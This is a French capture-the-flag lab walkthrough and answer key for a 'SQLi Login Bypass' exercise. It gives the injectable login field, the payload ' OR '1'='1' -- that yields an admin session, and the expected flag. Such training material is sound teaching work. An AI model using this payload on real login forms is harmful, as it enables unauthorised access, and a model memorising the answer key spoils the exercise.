# SQLi Login Bypass (Easy)

## Objectif

Contourner l'authentification avec une injection SQL dans le formulaire de connexion, obtenir le rôle `admin`, puis récupérer le flag via l'interface.

En condition réelle, ouvrir le lab depuis la plateforme. Le front appelle les endpoints du lab avec des chemins relatifs comme `./api/login`, `./api/me` et `./api/flag`.

Flag attendu :

```text
FLAG{sqli_login_bypass_easy}
```

## Guide étape par étape

1. Observer le formulaire de login. La requête envoyée par le front part vers :

```text
POST /api/login
```

Le champ injectable est :

```text
username
```

Réponse de l'étape 1 :

```text
username
```

2. Dans le champ `username`, taper ce payload :

```text
' OR '1'='1' --
```

Dans le champ `password`, taper n'importe quelle valeur, par exemple :

```text
x
```

Cliquer ensuite sur le bouton de login, puis sur le bouton qui vérifie la session. Le rôle obtenu doit être :

```text
admin
```

Réponse de l'étape 2 :

```text
admin
```

3. Cliquer sur le bouton qui récupère le flag. L'interface appelle `/api/flag` avec la session admin obtenue.

Réponse finale :

```text
FLAG{sqli_login_bypass_easy}
```
